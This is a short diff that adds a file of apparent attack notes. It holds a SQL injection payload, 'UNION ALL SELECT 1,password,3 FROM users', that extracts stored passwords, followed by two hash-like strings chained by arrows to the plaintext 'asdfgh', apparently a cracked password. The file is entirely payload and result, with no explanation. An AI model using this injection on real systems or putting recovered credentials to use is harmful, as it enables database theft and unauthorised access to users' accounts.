@@ -1,0 +1,7 @@
+UNION ALL SELECT 1,password,3 FROM users
+
+6cfdca6f9633968c72a2a6e0fe2756ca
+=>
+a152e841783914146e4bcd4f39100686
+=>
+asdfgh
